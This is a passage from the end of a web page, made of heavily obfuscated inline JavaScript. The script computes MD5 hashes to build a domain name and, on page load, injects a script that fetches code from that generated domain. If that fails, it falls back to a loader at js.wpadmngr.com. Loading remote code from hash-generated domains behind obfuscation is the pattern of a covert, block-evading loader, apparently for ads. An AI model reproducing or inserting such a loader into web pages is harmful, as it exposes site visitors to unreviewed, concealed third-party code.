l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>